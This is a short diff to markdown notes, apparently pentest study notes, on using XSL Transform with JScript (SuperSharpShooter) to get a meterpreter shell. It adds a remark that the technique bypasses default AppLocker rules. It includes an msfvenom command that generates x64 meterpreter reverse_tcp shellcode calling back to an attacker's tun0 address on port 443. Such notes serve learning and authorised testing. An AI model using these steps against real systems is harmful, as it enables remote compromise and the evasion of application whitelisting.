@@ -1,7 +1,9 @@
 # XSL Transform
 
 Can be combined with JScript code (SuperSharpShooter) to get a meterpreter shell.
--- We can use x64 shellcode.
+![CAUTION] 
+> Bypasses default AppLocker Rules.
+> We can use 64bit shellcode.
 
 ### Create shellcode:
 - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o output/shell.txt`
